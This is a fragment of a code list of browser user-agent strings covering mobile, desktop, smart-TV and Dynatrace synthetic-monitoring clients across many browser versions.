'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Ultra Shine) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.Driver3.34, HbbTV/1.1.1 _TV_MT5806/201.003.193.001 (Philips, PUS7805, wired) CE-HTML/1.0 NETTV/4.6.0.2 SignOn/2.0 SmartTvA/5.0.0 WH1.0 en',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5772271339651569436 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466689893 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7865156642124093568 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6670751412956561496 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4561993359 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1845925232077549528 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1261276775280332682 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7810421046257064829 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8492051667383076268 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825080150562520833 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466718264 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v9115122683762782470 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562017263 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3868737290396490733 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v697612484780489074 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8352206510814970335 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2496106158381954575 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1963937732068003945 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6911884164551000505 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562088966 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1614683479483188728 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v9072378626783597796 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2877543591798990017 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466812979 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5523782189735053614 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9047047070013589437 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v561687782311054040 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466831043 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2759418202117184174 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2348282376621666327 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562112209 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4832822234644260482 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8013439855011271596 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7458889217659953098 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2589944954845346012 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1759747179826740674 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466859412 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562136107 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v180382763332506508 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",
"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
"Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
"Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
"Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
